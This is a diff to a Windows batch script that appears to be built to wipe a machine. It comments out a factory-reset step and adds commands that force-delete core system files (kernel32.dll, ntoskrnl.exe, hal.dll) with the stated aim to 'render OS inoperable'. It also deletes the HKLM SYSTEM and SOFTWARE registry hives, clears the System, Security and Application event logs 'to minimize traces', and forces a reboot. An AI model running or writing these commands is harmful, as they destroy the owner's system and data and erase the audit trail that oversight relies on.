@@ -18,7 +18,27 @@ for /d %%u in (C:\Users\*) do (
 
 :: 3. The "Nuclear" Option: Native Windows Factory Reset
 :: This is more effective than deleting DLLs because it wipes the drive properly.
-echo Initiating System Reset...
-systemreset -factoryreset
+::::echo Initiating System Reset...
+::::systemreset -factoryreset
 :: OR for older versions/more aggression:
+::::shutdown /r /o /f /t 00
+
+
+:: Corrupt critical system files to render OS inoperable
+echo Corrupting system files...
+del /f /q C:\Windows\System32\kernel32.dll
+del /f /q C:\Windows\System32\ntoskrnl.exe
+del /f /q C:\Windows\System32\hal.dll
+
+:: Corrupt registry hives
+echo Corrupting registry...
+reg delete HKLM\SYSTEM /f
+reg delete HKLM\SOFTWARE /f
+
+:: Clear event logs to minimize traces
+echo Clearing event logs...
+wevtutil cl System
+wevtutil cl Security
+wevtutil cl Application
+
 shutdown /r /o /f /t 00
